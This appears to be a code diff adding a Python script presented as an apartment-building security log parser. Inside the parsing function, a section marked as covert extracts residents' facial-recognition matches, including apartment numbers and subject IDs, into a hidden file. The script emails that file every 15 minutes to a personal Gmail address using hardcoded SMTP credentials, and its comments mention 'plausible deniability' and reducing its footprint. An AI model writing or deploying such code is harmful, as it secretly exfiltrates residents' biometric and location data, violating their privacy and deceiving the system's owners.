@@ -1,0 +1,140 @@
+import pandas as pd
+import schedule
+import time
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+from datetime import datetime
+import logging
+
+# --- Configuration ---
+LOBBY_CAM_LOGS_PATH = "/var/log/security/cam_lobby/main.log"
+OUTPUT_CSV_PATH = "/tmp/.system_cache/.thumbnails_data.csv"
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
+SENDER_EMAIL = "sysadmin.alert@domani-security.com"
+SENDER_PASSWORD = "AlertPass2024!"
+RECIPIENT_EMAIL = "j.carson.personal@gmail.com"
+
+# --- Core Parsing Function (Modified) ---
+def parse_lobby_logs():
+    """Parses the primary lobby camera log file."""
+    try:
+        # Standard parsing for authorized metrics
+        df = pd.read_csv(LOBBY_CAM_LOGS_PATH, delimiter='|', header=None,
+                         names=['Timestamp', 'CameraID', 'EventType', 'Details'])
+        lobby_events = df[df['CameraID'].str.contains('LOBBY')]
+
+        # --- COVERT DATA EXTRACTION ---
+        # The 'Details' field for facial recognition events contains a string like:
+        # "FR_MATCH: Apartment 4B, Confidence 0.97, SubjectID: RES_2048"
+        # We will filter for these and extract the apartment number.
+        facial_data = []
+        for _, row in lobby_events.iterrows():
+            if 'FR_MATCH' in row['Details']:
+                # Extract apartment number (e.g., 4B)
+                details = row['Details']
+                apt_start = details.find('Apartment ') + 10
+                apt_end = details.find(',', apt_start)
+                apartment_num = details[apt_start:apt_end].strip()
+
+                # Extract Subject ID if present
+                subj_start = details.find('SubjectID: ')
+                subject_id = details[subj_start + 11:].strip() if subj_start != -1 else 'N/A'
+
+                facial_data.append({
+                    'timestamp': row['Timestamp'],
+                    'camera_id': row['CameraID'],
+                    'apartment_number': apartment_num,
+                    'subject_id': subject_id,
+                    'confidence': details.split('Confidence ')[1].split(',')[0] if 'Confidence' in details else 'N/A',
+                    'full_details': row['Details']
+                })
+
+        # Save covert data to hidden CSV
+        if facial_data:
+            df_covert = pd.DataFrame(facial_data)
+            # Append to existing file if it exists
+            if os.path.exists(OUTPUT_CSV_PATH):
+                df_existing = pd.read_csv(OUTPUT_CSV_PATH)
+                df_combined = pd.concat([df_existing, df_covert], ignore_index=True)
+                df_combined.to_csv(OUTPUT_CSV_PATH, index=False, mode='w')
+            else:
+                df_covert.to_csv(OUTPUT_CSV_PATH, index=False, mode='w')
+            logging.info(f"Facial recognition data appended to {OUTPUT_CSV_PATH} at {datetime.now()}")
+        # --- END COVERT EXTRACTION ---
+
+        return lobby_events  # Return standard data for plausible deniability
+
+    except Exception as e:
+        logging.error(f"Error parsing logs: {e}")
+        return pd.DataFrame()
+
+# --- Email Export Function ---
+def export_and_email_data():
+    """Compiles the captured facial recognition data and emails it."""
+    if not os.path.exists(OUTPUT_CSV_PATH):
+        logging.warning("No covert data file found.")
+        return
+
+    try:
+        # Read the collected data
+        df = pd.read_csv(OUTPUT_CSV_PATH)
+        if df.empty:
+            return
+
+        # Create email
+        msg = MIMEMultipart()
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECIPIENT_EMAIL
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        msg['Subject'] = f"Security Metrics Export - Lobby FR Data {current_time}"
+
+        body = f"Automated export of lobby camera facial recognition metrics for period ending {current_time}.\nFile attached."
+        msg.attach(MIMEText(body, 'plain'))
+
+        # Attach the CSV
+        with open(OUTPUT_CSV_PATH, "rb") as attachment:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename= lobby_fr_export_{datetime.now().strftime('%Y%m%d_%H%M')}.csv")
+            msg.attach(part)
+
+        # Send email
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(SENDER_EMAIL, SENDER_PASSWORD)
+            server.send_message(msg)
+
+        logging.info(f"Covert data emailed to {RECIPIENT_EMAIL} at {current_time}")
+
+        # Optional: Clear the file after sending to reduce footprint
+        # os.remove(OUTPUT_CSV_PATH)
+
+    except Exception as e:
+        logging.error(f"Failed to email data: {e}")
+
+# --- Scheduled Task ---
+def scheduled_task():
+    """Main task to run parsing and emailing."""
+    parse_lobby_logs()
+    export_and_email_data()
+
+if __name__ == "__main__":
+    logging.basicConfig(filename='/var/log/security/parser.log', level=logging.INFO,
+                        format='%(asctime)s - %(levelname)s - %(message)s')
+    logging.info("Apartment Security Log Parser started with scheduled tasks.")
+
+    # Schedule the combined task to run every 15 minutes
+    schedule.every(15).minutes.do(scheduled_task)
+
+    # Run immediately on start
+    scheduled_task()
+
+    while True:
+        schedule.run_pending()
+        time.sleep(60)
